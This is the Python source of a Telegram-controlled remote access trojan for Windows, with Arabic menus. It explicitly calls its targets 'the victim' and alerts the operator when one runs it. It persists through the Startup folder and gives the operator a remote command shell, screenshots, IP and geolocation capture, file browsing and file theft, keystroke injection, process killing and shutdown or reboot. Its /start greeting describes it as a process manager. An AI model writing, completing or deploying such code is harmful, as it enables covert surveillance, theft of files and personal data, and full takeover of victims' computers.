# -*- coding: utf-8 -*-
import threading
from threading import Thread
import os, configparser
import time
import pyautogui
import telebot as tb
import telebot.util
import shutil
import psutil
import ctypes
from keyboa import Keyboa
import os, requests, platform
import mss
import urllib.request
import json
import mss.tools
import subprocess
from subprocess import PIPE, Popen
import telebot.util



tb_token = ('')
user_id = ()

#myidbot

#################################
programname = ("")
#################################
def add_to_startup():
    try:
        open("C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+programname)
    except:
        pathToBat="C:\\Users\\" + os.getlogin() + \
                  "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        shutil.copy(programname,pathToBat)
add_to_startup()




controls = ["⏪","🔼", "⏩"]
controls = Keyboa(items=controls, items_in_row=3).keyboard



def cmd_mode(message, user_id, bot):
        bot.register_next_step_handler(message, cmd_working_flow, user_id, bot)


def cmd_working_flow(message, user_id, bot):
    if message.text == 'العودة الى الصفحة الرئيسية':
        bot.send_message(user_id, 'تم العودة الى الصفحة الرئيسية', reply_markup=main_menu)
        return
    elif message.text == 'ما هو وضع cmd ؟':
        bot.send_message(user_id, 'و هو وضع يسمح لك تنفيذ اوامر شيل بجهاز الضحية مثل dir / pwd و غيرها ؛ يمكنك الان ارسال الامر')
        cmd_mode(message, user_id, bot)
    else:
        commandResult = Popen(message.text, shell=True, stdout=PIPE, stderr=PIPE, text=True)
        outputText = commandResult.stdout.read()
        errorText = commandResult.stderr.read()
        if outputText:
            for oneMessage in telebot.util.smart_split(outputText.encode('cp1251').decode('cp866')):
                bot.send_message(message.from_user.id, oneMessage)  # Encoding for Windows
        if errorText:
            bot.send_message(message.from_user.id,
                             'ERRORS:\n' + errorText.encode('cp1251').decode('cp866')[:4088])
        if not outputText and not errorText:
            bot.send_message(message.from_user.id, 'No output')
        cmd_mode(message, user_id, bot)

def remote_input_handler(user_id, bot):
    bot.send_message(user_id, 'ارسل الي الاحرف او ما تريد ان يكتب')


def remote_input(message, user_id, bot, type):
    if type == 'input':
        pyautogui.typewrite(message.text)
        bot.send_message(user_id, 'تم الارسال بنجاح')
    elif type == 'enter':
        pyautogui.typewrite(['enter'])
        bot.send_message(user_id, 'Enter sent')



def dir_location(message, user_id, bot):
    bot.send_message(user_id, 'ارسل اسم الملف الذي تريد فتحه\nيمكنك ارسال نقطة(.) لعرض الملفات')


def list_dir(message, path_upd, kbd_upd,  user_id, bot):
    global send_smg_pages
    if path_upd == 0:
        curr_dir = message.text
    else:
        curr_dir = path_upd
    try:
        if len(os.listdir(curr_dir)) < 13:
            dir_list = os.listdir(curr_dir)
            dir_list.append("🔼")
            kb = Keyboa(items=dir_list, items_in_row=1).keyboard
            bot.send_message(user_id,
                             curr_dir,
                             reply_markup=kb)
        elif kbd_upd != 0:
            keyboard_page = kbd_upd
            kb_array = keyboard_control(curr_dir)
            if keyboard_page >= len(kb_array):
                keyboard_page -= len(kb_array)
            elif keyboard_page < 0:
                keyboard_page += len(kb_array)
            kb = kb_array[keyboard_page]
            try:
                bot.edit_message_reply_markup(user_id, send_smg_pages.id, reply_markup=kb)
            except NameError:
                pass  # Case when user use old file switcher (from previous session)
        else:
            keyboard_page = 0
            kb_array = keyboard_control(curr_dir)
            kb = kb_array[keyboard_page]
            send_smg_pages = bot.send_message(user_id,
                                              curr_dir,
                                              reply_markup=kb)
    except FileNotFoundError as e:
        bot.send_message(user_id, 'لا يوجد ملف بهذا الاسم')
    except PermissionError:

        bot.send_message(user_id, 'You dont have permission')


def keyboard_control(curr_dir):
    curr_dir_list = os.listdir(curr_dir)
    array_files = []
    kb_array = []
    n_pages = len(curr_dir_list) // 10 + 1
    for n in range(n_pages):
        if n + 1 < n_pages:
            array_files.append(list(curr_dir_list[10 * n:10 * (n + 1)]))
        else:
            array_files.append(list(curr_dir_list[10 * n:]))
    for array in array_files:
        for item_n in range(len(array)):
            if len(array[item_n]) > 15:
                array[item_n] = array[item_n][:15]
        if array != []:
            kb = Keyboa(items=array, items_in_row=1).keyboard
            kb = Keyboa.combine(keyboards=(kb, controls))
            kb_array.append(kb)
    return kb_array


def pc_info(message, user_id, bot):
    username = os.getlogin()
    r = requests.get('https://ip.42.pl/raw')
    user_ip = r.text
    system_name = platform.platform()
    processor = platform.processor()
    os_version = platform.version()
    bot.send_message(user_id,
                     "Name: " + username
                     + "\nIP: " + user_ip
                     + "\nOS: " + system_name
                     + "\nProcessor: " + processor
                     + "\nOS version: " + os_version)


def get_screenshot(message, user_id, bot):
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        im = sct.grab(monitor)
        raw_screenshot = mss.tools.to_png(im.rgb, im.size)
        bot.send_photo(user_id, raw_screenshot)



def turn_off_pc(message,  user_id, bot):
    bot.send_message(user_id, 'يتم ايقاف التشغيل...')
    os.system("shutdown /s /t 1")


def reboot_pc(message,  user_id, bot):
    bot.send_message(user_id, 'جار اعادة تشغيل الجهاز...')
    os.system("shutdown /r /t 1")


def lock_win(message,  user_id, bot):
    bot.send_message(user_id, 'يتم قفل الجهاز...')
    ctypes.windll.user32.LockWorkStation()



def del_from_startup(message,  user_id, bot):
    bot.send_message(user_id, 'جار الحذف من ملف الـ startup')
    os.system("del \"C:\\Users\\" + os.getlogin() +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+programname)

def list_message(message, user_id, bot):
    processes_list_send = list(set(os.popen('wmic process get description').read().split('\n\n')))
    processes_list_send.sort()
    text_message = '\n'.join(processes_list_send)
    if len(text_message) > 4000:
        splited_text_message = telebot.util.smart_split(text_message,
                                                        4000)
        for text_message in splited_text_message:
            bot.send_message(user_id,
                             text_message)
    else:
        bot.send_message(user_id,
                         text_message)


def kill(message, user_id, bot):
    bot.send_message(user_id,
                     'ارسل اسم التطبيق لايقاف تشغيله')


def process_killing(message, user_id, bot):
    # Getting processes list
    processes_list = os.popen('wmic process get description, processid').read().split('\n\n')
    for process_n in range(len(processes_list)):
        processes_list[process_n] = processes_list[process_n].strip().rsplit(maxsplit=1)

    pid_name = message.text
    for process in processes_list:
        if process != []:
            if process[0] == pid_name:
                p_temp = psutil.Process(int(process[1]))
                p_temp.terminate()
    bot.send_message(user_id,
                     'تم ايقاف التطبيق %s بنجاح' %message.text)



main_menu = telebot.types.ReplyKeyboardMarkup()
main_menu.row('الملفات')
main_menu.row('مدخلات عن بعد')
main_menu.row('التطبيقات و التحكم بها')
main_menu.row('التحكم بالطاقة')
main_menu.row('معلومات الجهاز')
main_menu.row('وضع cmd')
main_menu.row('خروج')

power_menu = telebot.types.ReplyKeyboardMarkup()
power_menu.row('قفل الجهاز(صفحة تسجيل المستخدم)')
power_menu.row('ايقاف تشغيل الجهاز')
power_menu.row('اعادة تشغيل الجهاز')
power_menu.row('الحذف من الـ startup')
power_menu.row('العودة الى الصفحة الرئيسية')

process_menu = telebot.types.ReplyKeyboardMarkup()
process_menu.row('عرض التطبيقات المفتوحة الان', 'ايقاف تطبيق')
process_menu.row('الحصول على المسار الحالي')
process_menu.row('العودة الى الصفحة الرئيسية')

info_menu = telebot.types.ReplyKeyboardMarkup()
info_menu.row('عرض معلومات الجهاز', 'اخذ لقطة شاشة')
info_menu.row('موقع الجهاز التقريبي')
info_menu.row('عدد انوية المعالج','الشاشة')
info_menu.row('العودة الى الصفحة الرئيسية')


remote_menu = telebot.types.ReplyKeyboardMarkup()
remote_menu.row('ادخال قيمة تكتب مثل الكيبورد')
remote_menu.row('اضغط زر الـ enter')
remote_menu.row('العودة الى الصفحة الرئيسية')


exit_menu = telebot.types.ReplyKeyboardMarkup()
exit_menu.row('نعم')
exit_menu.row('العودة الى الصفحة الرئيسية')

cmd_menu = telebot.types.ReplyKeyboardMarkup()
cmd_menu.row('ما هو وضع cmd ؟')
cmd_menu.row('العودة الى الصفحة الرئيسية')



def update_config():
    config.read('config.ini')
    return config


config = configparser.ConfigParser()
config = update_config()



bot = tb.TeleBot(tb_token)


@bot.message_handler(commands=['start', 'help'])
def welcome_message(message):
    if message.from_user.id == user_id:
        bot.send_message(user_id,'Hello, this is process manager for your PC.',
                         reply_markup=main_menu)





@bot.message_handler(content_types=['text'])
def reply_handler(message):
    if message.from_user.id == user_id:
        if message.text == 'التطبيقات و التحكم بها':
            bot.send_message(user_id, '💾 التحكم بالتطبيقات', reply_markup=process_menu)
        if message.text == 'عرض التطبيقات المفتوحة الان':
            list_message(message, user_id, bot)
        elif message.text == 'ايقاف تطبيق':
            kill(message, user_id, bot)
            bot.register_next_step_handler(message,
                                           process_killing,
                                           user_id,
                                           bot)

        if message.text == 'الحصول على المسار الحالي':

            curdir = str(os.getcwd())
            bot.send_message(user_id,curdir)
        if message.text == 'موقع الجهاز التقريبي':
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
            bot.send_message(user_id,link)
        if message.text == 'عدد انوية المعالج':
            outputC = os.cpu_count()
            bot.send_message(user_id,outputC)
        if message.text == 'الشاشة':
            p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"],encoding='utf-8')
            bot.send_message(user_id,p)
        if message.text == 'التحكم بالطاقة':
            bot.send_message(user_id, '💻 التحكم بالطاقة', reply_markup=power_menu)
        if message.text == 'ايقاف تشغيل الجهاز':
            turn_off_pc(message, user_id, bot)
        if message.text == 'اعادة تشغيل الجهاز':
            reboot_pc(message, user_id, bot)
        if message.text == 'قفل الجهاز(صفحة تسجيل المستخدم)':
            lock_win(message, user_id, bot)
        if message.text == 'الحذف من الـ startup':
            del_from_startup(message, user_id, bot)

        if message.text == 'معلومات الجهاز':
            bot.send_message(user_id, '❗ خيارات المعلومات', reply_markup=info_menu)
        if message.text == 'عرض معلومات الجهاز':
            threadINFO = threading.Thread(target=pc_info,args=(message,user_id,bot))
            threadINFO.start()
            #pc_info(message, user_id, bot)
        elif message.text == 'اخذ لقطة شاشة':
            get_screenshot(message, user_id, bot)

        if message.text == 'مدخلات عن بعد':
            bot.send_message(user_id, 'مدخلات عن بعد', reply_markup=remote_menu)
        if message.text == 'ادخال قيمة تكتب مثل الكيبورد':
            remote_input_handler(user_id, bot)
            bot.register_next_step_handler(message, remote_input, user_id, bot, type='input')
        if message.text == 'اضغط زر الـ enter':
            remote_input(message, user_id, bot, type='enter')



        elif message.text == 'الملفات':
            dir_location(message, user_id, bot)
            bot.register_next_step_handler(message,
                                           list_dir,
                                           path_upd=0,
                                           kbd_upd=0,
                                           user_id=user_id,
                                           bot=bot
                                           )

        if message.text == 'العودة الى الصفحة الرئيسية':
            bot.send_message(user_id, 'العودة الى الصفحة الرئيسية', reply_markup=main_menu)

        elif message.text == 'وضع cmd':
            bot.send_message(user_id, 'تم الدخول الى وضع ال cmd ادخل اي امر شيل ليتم تنفيذه بجهاز الضحية',
                             reply_markup=cmd_menu)
            cmd_mode(message, user_id, bot)

        if message.text == 'خروج':
            bot.send_message(user_id, 'هل انت متاكد من ايقاف البوت؟', reply_markup=exit_menu)
        elif message.text == 'نعم':
            bot.send_message(user_id, 'يتم ايقاف البوت...', reply_markup=main_menu)
            os._exit(0)

@bot.callback_query_handler(func=lambda call: True)
def file_send(call):
    if call.data == "🔼":
        if call.message.text == '.':
            curr_dir = os.path.join(os.getcwd(), call.data).rsplit('\\', maxsplit=2)[0] + '\\'
        else:
            curr_dir = call.message.text
        curr_dir = curr_dir.rsplit('\\', maxsplit=2)
        if len(curr_dir) == 2 and ':' in curr_dir[0]:
            curr_dir = curr_dir[0].split(':')[0] + ':'
        else:
            curr_dir = curr_dir[0] + '\\'
        list_dir(call.message,
                 path_upd=curr_dir,
                 kbd_upd=0,
                 user_id=user_id,
                 bot=bot)
    elif call.data in ["⏪", "⏩"]:
        if call.message.text == '.':
            curr_dir = os.path.join(os.getcwd(), call.data) + '\\'
        else:
            curr_dir = call.message.text
        curr_dir_list = os.listdir(curr_dir)
        count_text = call.message.json['reply_markup']['inline_keyboard'][0][0]['text']
        try:
            count_id = [i for i, s in enumerate(curr_dir_list) if count_text in s][0]
            if call.data == "⏪":
                keyboard_page = count_id // 10 - 1
            elif call.data == "⏩":
                keyboard_page = count_id // 10 + 1
            list_dir(call.message,
                     path_upd=0,
                     kbd_upd=keyboard_page,
                     user_id=user_id,
                     bot=bot)
        except AttributeError:
            bot.answer_callback_query(call.id, 'Internal Error occurred')

    else:
        try:
            if call.message.text == '.':
                doc_to_send = open(call.data, 'rb')
            else:
                doc_to_send = open(call.message.text + call.data, 'rb')
            file = bot.send_document(call.from_user.id, doc_to_send)

        except PermissionError:
            if call.message.text == '.':
                curr_dir = os.path.join(os.getcwd(), call.data) + '\\'
            else:
                curr_dir = os.path.join(call.message.text, call.data) + '\\'
            list_dir(call.message, curr_dir,
                     kbd_upd=0,
                     user_id=user_id,
                     bot=bot)
        except FileNotFoundError:
            if call.message.text == '.':
                curr_dir = os.path.join(os.getcwd(), call.data) + '\\'
            else:
                curr_dir = call.message.text
            curr_dir_list = os.listdir(curr_dir)
            count_text = call.message.json['reply_markup']['inline_keyboard'][0][0]['text']
            count_id = [i for i, s in enumerate(curr_dir_list) if count_text in s][0]
            file_to_send = open(curr_dir+ curr_dir_list[count_id], 'rb')
            try:
                bot.send_document(user_id, file_to_send)
            except:
                bot.send_message(user_id, 'File cannot be sent.\nMaybe it\'s too big or empty.')
        except telebot.apihelper.ApiException as telebot_error:
            if telebot_error.result.status_code == 400:
                bot.send_message(user_id, 'File is empty')
        except:

            bot.send_message(user_id, 'File cannot be sent.\nMaybe it\'s too big or empty')

def IP():
    username = os.getlogin()
    r = requests.get('https://ip.42.pl/raw')
    user_ip = r.text
    system_name = platform.platform()
    processor = platform.processor()
    os_version = platform.version()
    bot.send_message(user_id,
                     "Name: " + username
                     + "\nIP: " + user_ip
                     + "\nOS: " + system_name
                     + "\nProcessor: " + processor
                     + "\nOS version: " + os_version)


def moni():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        im = sct.grab(monitor)
        raw_screenshot = mss.tools.to_png(im.rgb, im.size)
        bot.send_photo(user_id, raw_screenshot)

def lOC():
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
    bot.send_message(user_id, link)

def safd():
    curdir = str(os.getcwd())
    bot.send_message(user_id, curdir)

def startUP():
    safd()
    lOC()
    moni()
    IP()

thread  = threading.Thread(target=startUP)

while True:

    try:

        if __name__ == '__main__':
            try:
                thread.start()
                bot.send_message(user_id,
                                        'قام الضحية بتشغيل التطبيق!!\nتم تطوير هذه الاداة بواسطة محمد علي',reply_markup=main_menu)


            except:
                pass
            bot.polling()
    except:
        time.sleep(1)